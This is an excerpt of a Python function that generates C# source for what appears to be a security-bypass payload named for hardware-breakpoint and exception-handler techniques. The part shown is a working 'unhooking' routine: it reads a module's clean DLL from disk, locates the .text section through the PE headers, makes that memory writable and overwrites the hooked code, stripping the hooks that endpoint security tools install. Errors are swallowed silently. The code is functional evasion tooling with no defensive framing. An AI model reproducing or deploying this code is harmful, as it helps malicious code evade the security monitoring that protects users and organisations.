...
def _hwbp_veh_bypass_cs(cls_name: str, method_name: str, *, public: bool) -> str:
    ...
    return (
        ...
        "                }}\n"
        "            }}\n\n"
        "            // CLR unhooking disabled — overwrites code in the active call\n"
        "            // stack, causing silent process crash.\n"
        "        }}\n"
        "        catch {{ }}\n"
        "    }}\n\n"
        "    // ── CLR Unhooking ──────────────────────────────────────\n\n"
        "    private static void UnhookModule(string moduleName)\n"
        "    {{\n"
        "        try\n"
        "        {{\n"
        "            var hModule = GetModuleHandle(moduleName);\n"
        "            if (hModule == IntPtr.Zero) return;\n\n"
        "            // Get the module file path from the loaded module\n"
        "            var path = new byte[512];\n"
        "            var len = GetModuleFileName(hModule, path, 512);\n"
        "            if (len == 0) return;\n"
        "            var modulePath = System.Text.Encoding.Unicode.GetString(path, 0, len * 2);\n\n"
        "            // Read the clean DLL from disk\n"
        "            var cleanBytes = File.ReadAllBytes(modulePath);\n\n"
        "            // Parse PE headers to find .text section\n"
        "            // DOS header: e_lfanew at offset 0x3C\n"
        "            int peOffset = BitConverter.ToInt32(cleanBytes, 0x3C);\n"
        "            // COFF header starts at peOffset+4, SizeOfOptionalHeader at +16\n"
        "            short numSections = BitConverter.ToInt16(cleanBytes, peOffset + 6);\n"
        "            short optHeaderSize = BitConverter.ToInt16(cleanBytes, peOffset + 20);\n"
        "            int sectionStart = peOffset + 24 + optHeaderSize;\n\n"
        "            // Find .text section (40 bytes per section entry)\n"
        "            for (int i = 0; i < numSections; i++)\n"
        "            {{\n"
        "                int off = sectionStart + i * 40;\n"
        "                // Section name at offset 0 (8 bytes)\n"
        "                if (cleanBytes[off] != (byte)'.' || cleanBytes[off+1] != (byte)'t'\n"
        "                    || cleanBytes[off+2] != (byte)'e' || cleanBytes[off+3] != (byte)'x'\n"
        "                    || cleanBytes[off+4] != (byte)'t')\n"
        "                    continue;\n\n"
        "                // VirtSize+8, VirtAddr+12, RawSize+16, RawAddr+20\n"
        "                int virtSize = BitConverter.ToInt32(cleanBytes, off + 8);\n"
        "                int virtAddr = BitConverter.ToInt32(cleanBytes, off + 12);\n"
        "                int rawSize = BitConverter.ToInt32(cleanBytes, off + 16);\n"
        "                int rawAddr = BitConverter.ToInt32(cleanBytes, off + 20);\n\n"
        "                int size = Math.Min(virtSize, rawSize);\n"
        "                if (size <= 0) break;\n\n"
        "                // Make the in-memory .text section writable\n"
        "                IntPtr textAddr = hModule + virtAddr;\n"
        "                VirtualProtect(textAddr, (uint)size, 0x40, out uint oldProt);\n\n"
        "                // Copy clean .text from disk over the hooked in-memory version\n"
        "                Marshal.Copy(cleanBytes, rawAddr, textAddr, size);\n\n"
        "                // Restore original protection\n"
        "                VirtualProtect(textAddr, (uint)size, oldProt, out _);\n"
        "                break;\n"
        "            }}\n"
        "        }}\n"
        "        catch {{ }}\n"
        ...
        "    private static extern int GetModuleFileName(IntPtr h, byte[] buf, int sz);\n"
        '    [DllImport("kernel32.dll")]\n'
